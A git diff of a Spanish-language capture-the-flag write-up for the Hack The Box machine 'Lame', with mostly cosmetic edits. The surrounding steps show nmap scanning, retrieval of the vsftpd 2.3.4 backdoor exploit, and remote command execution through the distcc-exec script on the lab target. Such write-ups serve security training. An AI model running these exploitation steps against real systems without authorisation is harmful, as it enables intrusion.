@@ -22,7 +22,7 @@ rtt min/avg/max/mdev = 37.842/37.842/37.842/0.000 ms
 Vamos a escanear todo el rango de puertos de la maquina
 
 ```shell
-nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.3
+> nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.3
 
 PORT     STATE SERVICE      REASON
 21/tcp   open  ftp          syn-ack ttl 63
@@ -35,7 +35,7 @@ PORT     STATE SERVICE      REASON
 Y sobre esos puertos vamos a escanear versiones
 
 ```shell
-nmap -sCV -p21,22,139,445,3632 10.10.10.3 -oN targeted
+> nmap -sCV -p21,22,139,445,3632 10.10.10.3 -oN targeted
 cat targeted | grep -oP '\d{1,5}/tcp.*' # Con la expression regular grepearemos la información mas relevante.
 21/tcp   open  ftp         vsftpd 2.3.4
 22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
@@ -126,7 +126,7 @@ Anonymous login successful
 
 ## Explotación
 
-Buscamos vulnerabilidades con `vsftpd 2.3.4` hi parece que si que hay asi que vamos a probarlo
+Buscamos vulnerabilidades con **vsftpd 2.3.4** y parece que si que hay así que vamos a probarlo
 
 ```shell
 > searchsploit vsftpd 2.3.4
@@ -139,13 +139,6 @@ vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                    | unix
 Shellcodes: No Results
 Papers: No Results
 > searchsploit -m unix/remote/49757.py
-  Exploit: vsftpd 2.3.4 - Backdoor Command Execution
-      URL: https://www.exploit-db.com/exploits/49757
-     Path: /usr/share/exploitdb/exploits/unix/remote/49757.py
-File Type: Python script, ASCII text executable
-
-Copied to: /home/red/Desktop/HTB/machines/Easy/Lame/exploits/49757.py
-
 > ls
  49757.py
 > mv 49757.py exploit.py
@@ -176,7 +169,7 @@ wget https://svn.nmap.org/nmap/scripts/distcc-cve2004-2687.nse -O /usr/share/nma
 Vemos que es vulnerable y podemos ejecutar comandos
 
 ```shell
-nmap -p 3632 10.10.10.3 --script distcc-exec --script-args="distcc-exec.cmd='id'"
+> nmap -p 3632 10.10.10.3 --script distcc-exec --script-args="distcc-exec.cmd='id'"
 
 PORT     STATE SERVICE
 3632/tcp open  distccd
